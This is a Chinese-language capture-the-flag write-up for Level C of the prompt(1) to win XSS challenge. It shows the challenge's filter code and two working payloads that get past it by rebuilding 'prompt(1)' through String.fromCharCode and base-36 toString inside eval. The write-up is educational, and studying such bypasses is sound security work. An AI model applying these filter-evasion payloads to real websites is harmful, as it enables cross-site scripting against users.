## [[prompt(1) to win](http://prompt.ml)] [[Level C - ノ┬─┬ノ ︵ ( \\o°o)\\](http://prompt.ml/12)] [[解题报告](http://exp-blog.com/2019/03/25/pid-3723/)]

------

## 题目

```javascript
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}
```

## 解题报告

这题与 【[Level A – (╯°□°）╯︵ ┻━┻](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2010%20-%20%28%E2%95%AF%C2%B0%E2%96%A1%C2%B0%EF%BC%89%E2%95%AF%EF%B8%B5%20%E2%94%BB%E2%94%81%E2%94%BB)】 十分相似。

区别在于 `replace` 的 `prompt` 和 单引号 `'` 的顺序反转了。

但是无论顺序如何，过滤后可以使用的字符都只剩下  `a-z`、 `A-Z`、`0-9`、 `.`、 `(`、 `)`、 `!`、 `~`、 `*` 。

因此这题直接使用 【[Level A – (╯°□°）╯︵ ┻━┻](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2010%20-%20%28%E2%95%AF%C2%B0%E2%96%A1%C2%B0%EF%BC%89%E2%95%AF%EF%B8%B5%20%E2%94%BB%E2%94%81%E2%94%BB)】 的 payload 就可以 pass ：

```javascript
eval(String.fromCharCode(112).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(String.fromCharCode(49)).concat(String.fromCharCode(41)))
```

![](http://exp-blog.com/wp-content/uploads/2019/03/8fa55dfbf21eda615a9d4e8d9f1489c3.png)


------------

但其实这题还有另一种更巧妙的解法。

在 JS 中存在一个函数 `parseInt(str, radix)` 。

默认情况下，`radix = 10`，即它可以把十进制的数字字符串转换成十进制数。

但是通过调整进制数 `radix` ，它可以把其他进制的字符串转换成十进制数。

而当 `radix = 36` 时。它可以把只包含 `0-9a-z` （大小写不敏感）的字符串转换成十进制数。

于是我们可以把 `prompt`  字符串转换成十进制数：`parseInt("prompt", 36)` ，得到 `1558153217` 。

![](http://exp-blog.com/wp-content/uploads/2019/03/a43377aa5be66084263005a782b9d068.png)

而要将十进制数字还原成字符串，则可以使用另一个函数 `toString(radix)` （默认情况下 `radix = 10` ）。

即可以使用此方法 `(1558153217).toString(36)` 还原得到 `prompt` 字符串：

![](http://exp-blog.com/wp-content/uploads/2019/03/85b16301a4c69f8e65057c0e757daf53.png)

于是最开始的 payload 就开始简化成这样：

```javascript
eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))
```

>  注：【[Level A – (╯°□°）╯︵ ┻━┻](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2010%20-%20%28%E2%95%AF%C2%B0%E2%96%A1%C2%B0%EF%BC%89%E2%95%AF%EF%B8%B5%20%E2%94%BB%E2%94%81%E2%94%BB)】 同样可以使用这个 payload 完成挑战。

![](http://exp-blog.com/wp-content/uploads/2019/03/c914d38fa8e27544a0f70ae8fbd018c4.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
